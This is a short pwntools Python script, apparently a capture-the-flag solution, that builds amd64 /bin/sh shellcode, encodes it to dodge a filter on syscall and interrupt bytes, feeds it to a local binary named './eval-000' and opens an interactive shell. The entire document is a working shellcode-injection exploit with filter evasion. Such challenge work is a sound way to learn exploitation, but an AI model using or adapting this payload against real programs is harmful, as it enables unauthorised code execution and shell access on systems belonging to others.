

from pwn import *

context.arch = 'amd64'

sc = shellcraft.sh()
sc = asm(sc)
sc = encoders.encode(sc, b'\x0f\x05\xcd')

p = process("./eval-000")

p.sendlineafter(":", sc)

p.interactive()
